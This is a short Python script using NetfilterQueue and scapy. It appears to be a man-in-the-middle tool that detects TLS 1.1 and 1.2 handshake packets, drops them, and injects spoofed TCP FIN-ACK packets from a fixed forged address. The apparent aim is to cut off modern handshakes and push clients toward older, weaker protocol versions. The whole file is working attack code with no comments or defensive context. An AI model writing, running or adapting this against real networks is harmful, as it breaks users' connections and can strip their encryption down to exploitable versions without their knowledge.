from netfilterqueue import NetfilterQueue
from scapy.all import *


def process(pkt):
    ip = IP(pkt.get_payload())
    if ip.haslayer("Raw"):
        payload = pkt.get_payload()
        if payload[40] == 0x16 and payload[41] == 0x03 and payload[49] == 0x03 and (
                payload[50] == 0x03 or payload[50] == 0x02):
            pkt.drop()
            new_packet = IP(dst=ip.dst, src="172.16.0.3") / TCP()
            new_packet[TCP].sport = ip[TCP].sport
            new_packet[TCP].dport = ip[TCP].dport
            new_packet[TCP].seq = ip[TCP].seq
            new_packet[TCP].ack = ip[TCP].ack
            new_packet[TCP].flags = 'FA'
            send(new_packet)
            print("SRC", ip.src)
            print("DST", ip.dst)
        else:
            pkt.accept()
    else:
        pkt.accept()


def main():
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, process, 100)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        pass


if __name__ == '__main__':
    main()
